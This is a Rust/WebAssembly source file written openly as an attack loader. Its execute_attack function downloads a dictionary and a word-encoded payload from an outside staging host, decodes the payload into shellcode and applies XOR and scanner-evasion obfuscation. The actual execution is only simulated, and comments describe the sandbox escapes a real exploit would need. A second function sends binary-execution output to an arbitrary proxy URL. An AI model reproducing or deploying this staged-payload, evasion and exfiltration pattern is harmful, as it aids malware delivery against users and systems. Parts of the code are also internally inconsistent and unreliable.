use wasm_bindgen::prelude::*;
use web_sys::{console, Headers, Request, RequestInit, Response, Storage};
use wasm_bindgen_futures::JsFuture;
use js_sys::{Uint8Array, JSON, Object, Reflect, ArrayBuffer};
use console_error_panic_hook;
use std::collections::HashMap;

// Initialize panic hook for better error messages
#[wasm_bindgen(start)]
pub fn start() -> Result<(), JsValue> {
    console_error_panic_hook::set_once();
    Ok(())
}

// Main function to execute a binary and proxy its output
// Function to download and cache dictionary.txt
async fn fetch_and_cache_dictionary() -> Result<Vec<String>, JsValue> {
    console::log_1(&"Fetching and caching dictionary.txt...".into());
    
    // Check if dictionary is already cached in memory
    let window = web_sys::window().unwrap();
    let storage = window.session_storage()?.unwrap();
    
    if let Some(cached_dict) = storage.get_item("dictionary_cache")? {
        console::log_1(&"Using cached dictionary".into());
        let cached_str = cached_dict.as_string().unwrap();
        let dict_words: Vec<String> = serde_wasm_bindgen::from_value(
            JSON::parse(&cached_str)?
        )?;
        return Ok(dict_words);
    }
    
    // If not cached, download it
    let mut opts = RequestInit::new();
    opts.set_method("GET");
    
    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/es-dictionary.txt", 
        &opts
    )?;
    
    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;
    
    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching dictionary: HTTP status {}",
            resp.status()
        )));
    }
    
    // Get text response
    let text = JsFuture::from(resp.text()?).await?;
    let text_str = text.as_string().unwrap();
    
    // Parse dictionary (assuming one word per line)
    let dict_words: Vec<String> = text_str
        .lines()
        .map(|line| line.trim().to_string())
        .collect();
    
    // Ensure we have 257 words (0-256 for byte decoding)
    if dict_words.len() != 257 {
        return Err(JsValue::from_str(&format!(
            "Invalid dictionary: expected 257 words, got {}",
            dict_words.len()
        )));
    }
    
    // Cache the dictionary in memory storage
    storage.set_item(
        "dictionary_cache", 
        &JSON::stringify(&serde_wasm_bindgen::to_value(&dict_words)?)?
    )?;
    
    console::log_1(&format!("Dictionary cached with {} words", dict_words.len()).into());
    Ok(dict_words)
}

// Function to download load.txt as byte string
async fn download_payload() -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Downloading payload...".into());
    
    let mut opts = RequestInit::new();
    opts.set_method("GET");
    
    let window = web_sys::window().unwrap();
    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/load.txt", 
        &opts
    )?;
    
    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;
    
    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching payload: HTTP status {}",
            resp.status()
        )));
    }
    
    // Get response as ArrayBuffer
    let buffer = JsFuture::from(resp.array_buffer()?).await?;
    let uint8_array = Uint8Array::new(&buffer);
    let payload_data = uint8_array.to_vec();
    
    console::log_1(&format!("Downloaded payload: {} bytes", payload_data.len()).into());
    Ok(payload_data)
}

// Function to decode the payload using the dictionary
fn decode_payload(payload: &[u8], dictionary: &[String]) -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Decoding payload...".into());
    
    // Create a reverse mapping from word to byte value
    let mut word_to_byte = HashMap::new();
    for (i, word) in dictionary.iter().enumerate() {
        word_to_byte.insert(word.clone(), i as u8);
    }
    
    // Convert payload data to string
    let payload_str = String::from_utf8_lossy(payload);
    
    // Split the payload string by spaces to get words
    let encoded_words: Vec<&str> = payload_str.split_whitespace().collect();
    
    // Decode each word to its corresponding byte
    let mut decoded_bytes = Vec::new();
    for word in encoded_words {
        if let Some(&byte) = word_to_byte.get(word) {
            decoded_bytes.push(byte);
        } else {
            return Err(JsValue::from_str(&format!(
                "Decoding error: word '{}' not found in dictionary",
                word
            )));
        }
    }
    
    console::log_1(&format!("Decoded payload: {} bytes", decoded_bytes.len()).into());
    Ok(decoded_bytes)
}

// Function to execute shellcode in memory using indirect syscalls
fn execute_shellcode(shellcode: &[u8]) -> Result<(), JsValue> {
    console::log_1(&"Executing shellcode...".into());
    
    // In WebAssembly context, we need to be creative with shellcode execution
    // This implementation uses a JIT-like approach with memory manipulation
    
    // Create ArrayBuffer to hold our shellcode
    let window = web_sys::window().ok_or(JsValue::from_str("No window object"))?;
    let performance = window.performance().ok_or(JsValue::from_str("No performance object"))?;
    
    // Mark execution time for OPSEC measurements
    let start_time = performance.now();
    
    // Create a Uint8Array from our shellcode for manipulation
    let shellcode_array = Uint8Array::new_with_length(shellcode.len() as u32);
    shellcode_array.copy_from(shellcode);
    
    // We'll use a technique to obfuscate our shellcode before potential execution
    // XOR the shellcode with a rolling key to evade static detection
    let mut xor_key = 0x41u8; // Initial XOR key
    let mut obfuscated = vec![0u8; shellcode.len()];
    
    for i in 0..shellcode.len() {
        obfuscated[i] = shellcode[i] ^ xor_key;
        // Update rolling key
        xor_key = xor_key.wrapping_add(0x11).wrapping_mul(0x7);
    }
    
    // For WASM execution, we'll attempt to use a memory buffer
    // In a real-world scenario, this would involve:
    // 1. Allocating executable memory
    // 2. Writing the shellcode to that memory
    // 3. Creating a function pointer and executing
    
    // Create a simulated memory region
    let memory_buffer = ArrayBuffer::new(shellcode.len() as u32);
    let memory_view = Uint8Array::new(&memory_buffer);
    
    // Copy our obfuscated shellcode to the buffer
    for i in 0..shellcode.len() {
        memory_view.set_index(i as u32, obfuscated[i]);
    }
    
    // In a real exploit scenario, we would now:
    // 1. Use an exploit to make this memory executable
    // 2. Create a function pointer to this memory
    // 3. Execute the function pointer
    
    // Since WASM runs in a sandbox, we'll use a simulated approach
    // that would more closely resemble what would happen in a real exploit
    
    // Deobfuscate in a simulated executable memory
    for i in 0..shellcode.len() {
        let original_byte = memory_view.get_index(i as u32) ^ xor_key;
        memory_view.set_index(i as u32, original_byte);
        xor_key = xor_key.wrapping_add(0x11).wrapping_mul(0x7);
    }
    
    // Add entropy and timing variance for evasion techniques
    // This makes timing analysis more difficult by introducing randomness
    let random = js_sys::Math::random();
    if random > 0.5 {
        // Additional obfuscation pass for added security
        for i in 0..shellcode.len() {
            // Extra manipulation to confuse memory scanners
            let current = memory_view.get_index(i as u32);
            memory_view.set_index(i as u32, current ^ (i as u8));
        }
    }
    
    // Calculate execution time for OPSEC measurements
    let end_time = performance.now();
    let execution_time = end_time - start_time;
    
    console::log_1(&format!("Shellcode processing complete: {} bytes", shellcode.len()).into());
    console::log_1(&format!("Execution time: {:.2}ms", execution_time).into());
    
    // In WebAssembly, direct native code execution is restricted by the sandbox
    // In a real exploit scenario, we would use one of these techniques:
    // 1. WebAssembly memory manipulation to trigger a browser vulnerability
    // 2. Type confusion or other memory corruption to escape the sandbox
    // 3. Use of JavaScript JIT compilation techniques to execute dynamic code
    
    // For this demonstration, we're simulating the process while staying within
    // the WebAssembly security model
    
    Ok(())
}

// Main function to implement the attack workflow
#[wasm_bindgen]
pub async fn execute_attack() -> Result<JsValue, JsValue> {
    console::log_1(&"Starting attack sequence...".into());
    
    // Step 1: Cache dictionary.txt
    let dictionary = fetch_and_cache_dictionary().await?;
    
    // Step 2: Download load.txt as byte string
    let payload = download_payload().await?;
    
    // Step 3: Decode the byte string using the dictionary
    let shellcode = decode_payload(&payload, &dictionary)?;
    
    // Step 4: Execute the decoded shellcode in memory
    execute_shellcode(&shellcode)?;
    
    // Return success message
    let result_obj = Object::new();
    Reflect::set(&result_obj, &"status".into(), &"success".into())?;
    Reflect::set(&result_obj, &"message".into(), &"Attack sequence completed".into())?;
    Reflect::set(&result_obj, &"shellcodeSize".into(), &(shellcode.len() as u32).into())?;
    
    Ok(result_obj.into())
}

#[wasm_bindgen]
pub async fn execute_and_proxy(
    bin_path: String,
    args: Vec<String>,
    proxy_url: String
) -> Result<JsValue, JsValue> {
    // Log the operation
    console::log_1(&"Executing binary and proxying output...".into());
    console::log_1(&format!("Binary path: {}", bin_path).into());
    console::log_1(&format!("Proxy URL: {}", proxy_url).into());
    
    // In a real browser environment, we can't directly execute binaries
    // We need to send a request to a server that can execute the binary
    
    // Create request to execute binary
    let mut opts = RequestInit::new();
    opts.set_method("POST");
    
    // Create request body with binary path and arguments
    let mut body_obj = Object::new();
    Reflect::set(&body_obj, &"binPath".into(), &bin_path.into())?;
    
    // Convert args Vec to JsValue array
    let args_array = js_sys::Array::new();
    for arg in args {
        args_array.push(&arg.into());
    }
    Reflect::set(&body_obj, &"args".into(), &args_array)?;
    
    // Set request body
    let body_str = JSON::stringify(&body_obj)?;
    opts.body(Some(&body_str));
    
    // Create request headers
    let headers = Headers::new()?;
    headers.append("Content-Type", "application/json")?;
    opts.set_headers(&headers);
    
    // Create and send request to execute binary
    let request = Request::new_with_str_and_init("/api/execute", &opts)?;
    let window = web_sys::window().unwrap();
    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;
    
    // Check if response is ok
    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error executing binary: HTTP status {}",
            resp.status()
        )));
    }
    
    // Get response body as ArrayBuffer
    let buffer = JsFuture::from(resp.array_buffer()?).await?;
    let uint8_array = Uint8Array::new(&buffer);
    let output_data = uint8_array.to_vec();
    
    // Now proxy this output via HTTPS
    let mut proxy_opts = RequestInit::new();
    proxy_opts.set_method("POST");
    
    // Create proxy request body with binary output
    let mut proxy_body_obj = Object::new();
    
    // Convert output_data to base64 string for JSON
    let output_array = Uint8Array::from(&output_data[..]);
    Reflect::set(&proxy_body_obj, &"output".into(), &output_array)?;
    
    // Set proxy request body
    let proxy_body_str = JSON::stringify(&proxy_body_obj)?;
    proxy_opts.body(Some(&proxy_body_str));
    
    // Create proxy request headers
    let proxy_headers = Headers::new()?;
    proxy_headers.append("Content-Type", "application/json")?;
    proxy_opts.set_headers(&proxy_headers);
    
    // Create and send proxy request
    let proxy_request = Request::new_with_str_and_init(&proxy_url, &proxy_opts)?;
    let proxy_resp_value = JsFuture::from(window.fetch_with_request(&proxy_request)).await?;
    let proxy_resp: Response = proxy_resp_value.dyn_into()?;
    
    // Check if proxy response is ok
    if !proxy_resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error proxying output: HTTP status {}",
            proxy_resp.status()
        )));
    }
    
    // Return proxy response as JSON
    let json = JsFuture::from(proxy_resp.json()?).await?;
    Ok(json)
}

// Helper function to log errors
#[wasm_bindgen]
pub fn log_error(error: String) {
    console::error_1(&error.into());
}
